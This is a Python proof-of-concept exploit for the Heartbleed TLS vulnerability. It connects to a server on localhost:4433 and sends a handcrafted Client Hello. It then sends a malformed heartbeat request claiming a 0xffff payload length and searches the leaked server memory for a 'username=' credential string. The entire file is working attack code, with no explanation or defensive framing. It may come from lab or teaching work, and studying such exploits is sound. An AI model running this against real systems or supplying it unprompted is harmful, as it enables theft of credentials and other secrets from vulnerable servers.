import socket
import binascii

tls_hello_s = "1603020034010000300302615d9acb434f4445434f4445434f4445434f4445434f4445434f4445434f4445000002002f01000005ff01000100"
tls_hello = bytes.fromhex(tls_hello_s)

tls_heartbeat_s = "180302000301ffff"
tls_heartbeat = bytes.fromhex(tls_heartbeat_s)

def findCredentials(response):
    credentials = b"username="
    index = response.find(credentials)
    if index != -1:
        end_index = response.find(b'\x00', index)
        if end_index != -1:
            return response[index+len(credentials):end_index].decode()
    return None

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server_address = ('localhost', 4433)
print('[Connecting to {} port {}]'.format(*server_address))
s.connect(server_address)

try:
    s.sendall(tls_hello)     # Send Client Hello
    s.recv(8 * 1024)         # Receive Server Hello, Certificate, Server Hello Done
    s.sendall(tls_heartbeat) # Send Heartbeat Request
    r = s.recv(128*1024)      # Receive server response

    print(r)

    credentials = findCredentials(r)
    if credentials:
        print("Credentials found:", credentials)
    else:
        print("Credentials not found")
    
finally:
    print('[Closing socket]')
    s.close()
